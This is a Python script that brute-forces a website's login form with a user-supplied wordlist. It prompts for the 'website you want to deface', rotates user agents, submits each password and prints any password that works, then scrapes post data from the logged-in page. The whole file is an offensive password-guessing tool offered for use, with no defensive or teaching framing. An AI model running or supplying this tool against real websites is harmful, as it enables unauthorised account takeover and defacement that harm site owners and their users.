import mechanize
from bs4 import BeautifulSoup
from banner import banner
import random

## COLORS ###############
wi="\033[1;37m" #>>White#
rd="\033[1;31m" #>Red   #
gr="\033[1;32m" #>Green #
yl="\033[1;33m" #>Yellow#
bl ="\033[1;36m" #>blue   #
#########################
print(yl + banner)
loop = 0
url = input(wi+ "url of the website you want to deface : ")
passwd = input(wi+"name of the selected form: ")
wordlist =input(wi+"path to your worldist: ")
useProxy = None
r = mechanize.Browser()
r.set_handle_robots(False)
r._factory.is_html = True
r.addheaders=[('User-agent',random.choice([
               'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) RockMelt/0.9.58.494 Chrome/11.0.696.71 Safari/534.24',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.54 Safari/535.2',
               'Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54',
               'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11',
               'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.6 (KHTML, like Gecko) Chrome/16.0.897.0 Safari/535.6',
               'Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20121202 Firefox/17.0 Iceweasel/17.0.1']))]

try:
    wordlist = open(wordlist, "r")
except:
    print("Path to your wordlist is not found")
    print("maybe you should create another one here")
    exit()
for password in wordlist:
    try:
        r.open(url)
    except KeyboardInterrupt:
        print(rd+"ERROR: "+ yl + "Conection Failed" + rd + "or " + yl+ "the url you enter does't exits!!")
        exit(0)
    r.select_form(nr = 0)
    try:
        r.form[passwd]= password.strip()
    except:
        print(rd+"ERROR: " + yl +"No Attribute Name "+ bl +passwd)
    r.method ="POST"
    response =r.submit()
    bsh = BeautifulSoup(response.read(), 'html.parser')
    bs = bsh.find("h3")
    if bs:
        loop +=1
        print(wi+"["+bl+str(loop)+wi +"]"+yl+"trying password..."+wi+"["+ password.strip()+ "]" +rd+" Login Failed"+wi+"!!!")
        pass

    else:
        print(gr+ "one password found")
        print(wi+"password " +yl+"= " +bl+ password.strip())
        rep=r.open(response.geturl())
        get = BeautifulSoup(rep.read(), 'html.parser')
        dumb= get.find_all(name ='div', class_='poster')[0].text
        dumb2 = get.find_all(name = 'div', class_='positem')[0].find("u").text
        print(bl+ "date =" +wi+dumb)
        print(bl+ "subject =" + wi+dumb2)
        continue
